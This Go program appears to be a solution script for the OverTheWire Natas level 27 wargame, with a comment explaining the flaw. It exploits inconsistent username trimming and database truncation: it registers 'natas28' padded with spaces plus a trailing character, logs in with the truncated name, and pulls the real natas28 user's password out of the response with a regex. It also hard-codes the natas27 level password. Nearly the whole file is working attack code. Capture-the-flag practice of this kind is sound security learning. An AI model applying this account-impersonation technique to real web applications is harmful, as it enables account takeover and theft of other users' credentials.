package main

import (
	"fmt"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strings"
)

/* Natas27

The key insight for this challenge is that the server side code is inconsistent
in how it handles whitespace and max lengths.

We'll exploit this by creating a user with a username of:

	"natas28" + 57 spaces + "x"  (the "x" can be any character)

This user will be considered a new user by `validUser` and will thus trigger
`createUser`. `createUser` checks whether there is extra whitespace at the end
of the username and will error out if there is. The "x" at the end of our
crafted username allows this check to bypass, but the "x" is not written
to the database because `createUser` trims the string to 64 characters long
to match the database field length.

As a result, when we use this username to login (with any passsword)
`validUser` will see it as a new user and trigger `createUser` which will
create a new user in the database with the username of "natas28" + 57 spaces.
As we discussed above the "x" we added is truncated by `createUser`.

Next we login using "natas28" + 57 spaces as the username and whatever password
you selected (in the code below we just omit the password entirely). `validUser`
and `checkCredentials` all work as expected treating us as an existing user.

Now the magic happens, when `dumpData` is called it trims the whitespace from the
end of our crafted username. This is the key inconsistency in the code which
enables our exploit. The resulting username is just "natas28" without any spaces
and as a result `dumpData` helpfully returns the password for
the actual "natas28" user.
*/

func main() {

	// the password for this challenge (natas27)
	natas27Password := "PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3"

	// the username we want to get the password for
	username := "natas28"

	client := http.DefaultClient
	data := url.Values{
		// this is the crafted username which is exactly 65 characters long
		"username": {username + strings.Repeat(" ", 64-len(username)) + "x"},
		// we can just ignore the password
		"password": {""},
	}

	req, err := http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/index.php", strings.NewReader(data.Encode()))
	if err != nil {
		fmt.Println(err)
	}
	req.SetBasicAuth("natas27", natas27Password)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()

	// at this point `createUser` has run and there is now a new user with our
	// special username. Next we login as that user to exploit the inconsistent
	// handling in `dumpData` and get the password.

	data2 := url.Values{
		// this is the crafted username but it's exactly 64 characters this time
		// so that it matches what is in the database.
		"username": {username + strings.Repeat(" ", 64-len(username))},
		// we continue to ignore the password
		"password": {""},
	}
	req2, err := http.NewRequest("POST", "http://natas27.natas.labs.overthewire.org/index.php", strings.NewReader(data2.Encode()))
	if err != nil {
		fmt.Println(err)
	}
	req2.SetBasicAuth("natas27", natas27Password)
	req2.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp2, err := client.Do(req2)
	if err != nil {
		log.Fatal(err)
	}
	defer resp2.Body.Close()

	// assuming everything worked we can pull the password out via regex.
	respString, _ := httputil.DumpResponse(resp2, true)
	regex, _ := regexp.Compile("\\[password\\] (=&gt;|=>) (?P<password>[a-zA-Z0-9]{32})")
	matches := regex.FindStringSubmatch(string(respString))
	fmt.Println(matches[len(matches)-1])
}
